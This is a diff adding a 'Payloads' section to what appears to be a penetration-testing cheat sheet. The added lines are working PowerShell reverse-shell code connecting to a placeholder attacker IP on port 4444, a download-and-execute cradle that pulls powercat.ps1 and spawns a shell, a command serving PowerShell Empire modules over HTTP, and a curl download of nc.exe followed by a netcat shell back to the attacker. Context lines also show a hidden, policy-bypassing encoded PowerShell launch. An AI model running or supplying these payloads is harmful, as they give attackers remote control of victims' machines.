@@ -73,4 +73,23 @@ lua: os.execute('/bin/bash')
 powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
 ```
 
+### Payloads
 
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('Y.Y.Y.Y',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://Y.Y.Y.Y/powercat.ps1');powercat -c Y.Y.Y.Y -p 4444 -e powershell
+
+cd /usr/share/powershell-empire/empire/server/data/module_source/management
+python3 -m http.server 80
+```
+
+
+```powershell
+curl http://Y.Y.Y.Y/nc.exe -o C:/Windows/Temp/nc.exe
+
+C:/Windows/Temp/nc.exe Y.Y.Y.Y 4444 -e cmd
+```
